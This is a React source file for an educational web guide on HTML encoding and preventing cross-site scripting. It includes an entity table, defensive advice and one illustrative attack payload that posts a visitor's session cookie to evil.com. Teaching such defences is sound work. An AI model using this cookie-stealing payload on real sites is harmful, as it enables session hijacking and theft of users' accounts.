import React from 'react';
import { Link } from 'react-router-dom';
import { BookOpen, ArrowRight, AlertCircle, ShieldCheck } from 'lucide-react';
import { ToolPageWrapper } from '../../components/ToolPageWrapper';
import { SEO } from '../../components/SEO';

export const HtmlEncodingGuide: React.FC = () => {
  return (
    <ToolPageWrapper
      title="HTML Encoding and XSS: Why Escaping Input Saves Your Users"
      description="Failing to escape HTML in user-generated content is the root cause of XSS attacks. Learn what HTML encoding is, how XSS works, and how to prevent it."
      breadcrumbs={[{ label: 'Guides', href: '/guides' }, { label: 'HTML Encoding & XSS' }]}
      accentColor="error"
    >
      <SEO
        title="HTML Encoding and XSS Prevention Guide | KooBrain"
        description="Learn what HTML encoding is, how Cross-Site Scripting (XSS) attacks work, which characters must be escaped, and how to protect your users from injection attacks."
        keywords="html encoding, xss prevention, cross-site scripting, html escape, html entities, xss attack explained, sanitize html"
      />

      <article className="mt-8 max-w-3xl space-y-10">

        <section className="bg-error/5 border border-error/20 rounded-3xl p-8">
          <div className="flex items-start gap-4">
            <div className="size-10 rounded-xl bg-error/10 flex items-center justify-center shrink-0">
              <BookOpen className="size-5 text-error" />
            </div>
            <div>
              <p className="text-on-surface font-bold mb-2">What you'll learn</p>
              <ul className="text-sm text-on-surface-variant space-y-1 leading-relaxed">
                <li>• What HTML encoding is and why it exists</li>
                <li>• How Cross-Site Scripting (XSS) attacks work</li>
                <li>• Which five characters must always be escaped</li>
                <li>• The difference between encoding, escaping, and sanitizing</li>
                <li>• Where in your code you need to apply encoding</li>
              </ul>
            </div>
          </div>
        </section>

        <section className="space-y-4">
          <h2 className="text-2xl font-black text-on-surface">What is HTML Encoding?</h2>
          <p className="text-on-surface-variant leading-relaxed">
            HTML uses certain characters as syntax: <code className="bg-surface-container-highest px-1.5 py-0.5 rounded text-sm">&lt;</code> opens a tag, <code className="bg-surface-container-highest px-1.5 py-0.5 rounded text-sm">&gt;</code> closes one, <code className="bg-surface-container-highest px-1.5 py-0.5 rounded text-sm">&amp;</code> starts an entity reference. When you display user-supplied text on a web page, these characters in the text must be replaced with their <strong className="text-on-surface">HTML entity equivalents</strong> — safe representations that the browser renders as literal characters instead of interpreting as HTML syntax.
          </p>
          <div className="overflow-x-auto">
            <table className="w-full text-sm border-collapse">
              <thead>
                <tr className="border-b border-outline-variant/30">
                  <th className="text-left py-2 pr-4 font-bold text-on-surface">Character</th>
                  <th className="text-left py-2 pr-4 font-bold text-on-surface">Entity (named)</th>
                  <th className="text-left py-2 font-bold text-on-surface">Entity (numeric)</th>
                </tr>
              </thead>
              <tbody className="text-on-surface-variant">
                {[
                  ['<', '&lt;', '&#60;'],
                  ['>', '&gt;', '&#62;'],
                  ['&', '&amp;', '&#38;'],
                  ['"', '&quot;', '&#34;'],
                  ["'", '&apos;', '&#39;'],
                ].map(([ch, named, num]) => (
                  <tr key={ch} className="border-b border-outline-variant/10">
                    <td className="py-2 pr-4 font-mono font-bold text-error">{ch}</td>
                    <td className="py-2 pr-4 font-mono">{named}</td>
                    <td className="py-2 font-mono">{num}</td>
                  </tr>
                ))}
              </tbody>
            </table>
          </div>
        </section>

        <section className="space-y-4">
          <h2 className="text-2xl font-black text-on-surface">How XSS Attacks Work</h2>
          <p className="text-on-surface-variant leading-relaxed">
            Cross-Site Scripting (XSS) happens when an attacker injects malicious script into a web page that other users view. Here is the simplest example — a comment form that does not escape input:
          </p>
          <div className="bg-surface-container-highest rounded-2xl p-6 overflow-x-auto">
            <pre className="text-sm text-on-surface font-mono leading-relaxed">{`# Attacker submits this as a comment:
<script>
  document.location='https://evil.com/steal?c='+document.cookie
</script>

# Server stores it and renders without escaping:
<p>User comment: <script>document.location=...</script></p>

# Every visitor who loads the page executes the attacker's script
# and their session cookie is sent to evil.com`}</pre>
          </div>
          <p className="text-on-surface-variant leading-relaxed">
            The attacker's script runs with the same privileges as your legitimate page. It can steal session cookies, capture keystrokes, redirect users, modify the page content, or make API requests on behalf of the victim.
          </p>
        </section>

        <section className="space-y-4">
          <h2 className="text-2xl font-black text-on-surface">The Fix: Always Escape Before Rendering</h2>
          <p className="text-on-surface-variant leading-relaxed">
            If the server had encoded the input before storing or rendering it, the attack would have been completely neutralized:
          </p>
          <div className="grid sm:grid-cols-2 gap-4">
            <div className="bg-surface-container-highest rounded-2xl p-5">
              <p className="text-[10px] font-black uppercase tracking-widest text-error mb-3">Vulnerable output</p>
              <pre className="text-xs text-on-surface font-mono leading-relaxed break-all">{`<p>
  <script>alert('xss')</script>
</p>`}</pre>
            </div>
            <div className="bg-surface-container-highest rounded-2xl p-5">
              <p className="text-[10px] font-black uppercase tracking-widest text-secondary mb-3">Safe output (encoded)</p>
              <pre className="text-xs text-on-surface font-mono leading-relaxed break-all">{`<p>
  &lt;script&gt;alert('xss')
  &lt;/script&gt;
</p>`}</pre>
            </div>
          </div>
          <p className="text-on-surface-variant leading-relaxed">
            The browser renders the encoded version as the literal text <code className="bg-surface-container-highest px-1.5 py-0.5 rounded text-sm">&lt;script&gt;alert('xss')&lt;/script&gt;</code> — exactly what the user typed, displayed safely as content, not executed as code.
          </p>
        </section>

        <section className="space-y-4">
          <h2 className="text-2xl font-black text-on-surface">Encoding vs Escaping vs Sanitizing</h2>
          <div className="space-y-3">
            {[
              { term: 'HTML Encoding', desc: 'Replaces dangerous characters with their HTML entity equivalents. The original content is preserved and reversible — encoding just makes it safe to render in HTML context. Use this when you want to display content exactly as entered.' },
              { term: 'HTML Escaping', desc: 'Often used interchangeably with encoding, but technically refers to the act of escaping characters to prevent them being interpreted as HTML syntax. Same result, different framing.' },
              { term: 'HTML Sanitizing', desc: 'Strips or transforms dangerous HTML while preserving safe markup. Used when you want to allow some HTML (e.g. bold, links) but not script tags or event handlers. Sanitizing is more complex and requires a dedicated library (DOMPurify, Bleach). Encoding is simpler and safer when you want to display plain text.' },
            ].map(t => (
              <div key={t.term} className="p-4 rounded-2xl border border-outline-variant/20 bg-surface-container-low">
                <p className="font-bold text-on-surface text-sm mb-1">{t.term}</p>
                <p className="text-xs text-on-surface-variant leading-relaxed">{t.desc}</p>
              </div>
            ))}
          </div>
        </section>

        <section className="space-y-4">
          <h2 className="text-2xl font-black text-on-surface">Where You Must Apply Encoding</h2>
          <div className="bg-error/5 border border-error/20 rounded-2xl p-6 space-y-3">
            <p className="text-sm font-bold text-on-surface mb-1">Any time user input appears in HTML output:</p>
            {[
              'Rendering user-submitted comments, reviews, or form input in HTML',
              'Displaying names, addresses, or bio fields from user profiles',
              'Rendering search query terms back in search result pages',
              'Displaying file names, path names, or URLs in HTML',
              'Error messages that echo back request parameters',
            ].map((item, i) => (
              <div key={i} className="flex items-start gap-3">
                <AlertCircle className="size-4 text-error mt-0.5 shrink-0" />
                <p className="text-xs text-on-surface-variant leading-relaxed">{item}</p>
              </div>
            ))}
          </div>
          <div className="flex items-start gap-3 p-4 rounded-2xl bg-secondary/5 border border-secondary/20">
            <ShieldCheck className="size-5 text-secondary mt-0.5 shrink-0" />
            <p className="text-sm text-on-surface-variant leading-relaxed">
              <strong className="text-on-surface">Good news:</strong> Modern frontend frameworks like React, Vue, and Angular automatically HTML-encode text content rendered through JSX or template bindings. The risk is highest when using <code className="text-xs bg-surface-container-highest px-1 py-0.5 rounded">dangerouslySetInnerHTML</code> in React, <code className="text-xs bg-surface-container-highest px-1 py-0.5 rounded">v-html</code> in Vue, or <code className="text-xs bg-surface-container-highest px-1 py-0.5 rounded">innerHTML</code> in plain JavaScript — all of which bypass automatic encoding.
            </p>
          </div>
        </section>

        <section className="rounded-3xl border border-error/20 bg-gradient-to-br from-error/8 via-surface-container to-surface-container-high p-8 flex flex-col sm:flex-row items-start sm:items-center gap-6">
          <div className="flex-1">
            <h3 className="text-lg font-black text-on-surface mb-1">Test HTML encoding and decoding</h3>
            <p className="text-sm text-on-surface-variant">Use KooBrain's HTML Encode tool to escape any string for safe HTML rendering, or decode HTML entities back to readable text.</p>
          </div>
          <Link to="/html-encode" className="inline-flex items-center gap-2 rounded-2xl bg-error px-5 py-3 font-extrabold text-on-error hover:opacity-90 transition-opacity text-sm shrink-0">
            HTML Encode / Decode <ArrowRight className="size-4" />
          </Link>
        </section>

        <div className="pt-2">
          <Link to="/guides" className="inline-flex items-center gap-2 text-sm font-black text-on-surface-variant hover:text-primary transition-colors">
            ← Back to all guides
          </Link>
        </div>

      </article>
    </ToolPageWrapper>
  );
};
